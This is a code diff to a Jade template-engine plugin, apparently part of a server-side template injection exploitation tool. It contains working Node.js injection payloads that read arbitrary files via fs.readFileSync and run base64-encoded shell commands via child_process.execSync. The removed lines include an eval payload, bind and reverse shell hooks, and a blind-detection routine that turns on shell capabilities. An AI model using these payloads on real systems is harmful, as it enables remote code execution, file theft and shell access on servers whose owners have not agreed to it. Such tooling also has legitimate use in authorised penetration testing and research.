@@ -1,13 +1,13 @@
 from utils.strings import quote, chunkit, md5
 from utils.loggers import log
 from core import languages
-from core.plugin import Plugin
+from plugins.languages import javascript
 from utils import rand
 import base64
 import re
 
 
-class Jade(Plugin):
+class Jade(javascript.Javascript):
     
     def init(self):
 
@@ -17,13 +17,6 @@ class Jade(Plugin):
                 'render': '\n= %(code)s\n',
                 'header': '\n= %(header)s\n',
                 'trailer': '\n= %(trailer)s\n',
-                'render_test': """'%(s1)s'+'%(s2)s'""" % { 
-                    's1' : rand.randstrings[0], 
-                    's2' : rand.randstrings[1]
-                },
-                'render_expected': '%(res)s' % { 
-                    'res' : rand.randstrings[0]+rand.randstrings[1] 
-                }
             },
             # No evaluate_blind here, since we've no sleep, we'll use inject
             'write' : {
@@ -34,18 +27,11 @@ class Jade(Plugin):
             },
             'read' : {
                 'call': 'render',
-                'read' : """= global.process.mainModule.require('fs').readFileSync('%(path)s').toString('base64')"""
+                'read' : """global.process.mainModule.require('fs').readFileSync('%(path)s').toString('base64')"""
             },
             'md5' : {
                 'call': 'render',
-                'md5': """
-- x = global.process.mainModule.require
-= x('crypto').createHash('md5').update(x('fs').readFileSync('%(path)s')).digest("hex")
-"""
-            },
-            'evaluate' : {
-                'call': 'render',
-                'evaluate': """= eval(Buffer('%(code_b64)s', 'base64').toString())"""
+                'md5': """global.process.mainModule.require('crypto').createHash('md5').update(global.process.mainModule.require('fs').readFileSync('%(path)s')).digest("hex")"""
             },
             'blind' : {
                 'call': 'execute_blind',
@@ -67,16 +53,8 @@ class Jade(Plugin):
             },
             'execute' : {
                 'call': 'render',
-                'execute': """= global.process.mainModule.require('child_process').execSync(Buffer('%(code_b64)s', 'base64').toString())"""
+                'execute': """global.process.mainModule.require('child_process').execSync(Buffer('%(code_b64)s', 'base64').toString())"""
             },
-            'bind_shell' : {
-                'call' : 'execute_blind',
-                'bind_shell': languages.bash_bind_shell
-            },
-            'reverse_shell' : {
-                'call': 'execute_blind',
-                'reverse_shell' : languages.bash_reverse_shell
-            }
         })
 
         self.set_contexts([
@@ -110,13 +88,3 @@ class Jade(Plugin):
                 self.set('reverse_shell', True)
 
 
-    def blind_detected(self):
-
-        self.set('engine', self.plugin.lower())
-        self.set('language', self.language)
-
-        if self.execute_blind('echo %s' % str(rand.randint_n(2))):
-            self.set('execute_blind', True)
-            self.set('write', True)
-            self.set('bind_shell', True)
-            self.set('reverse_shell', True)
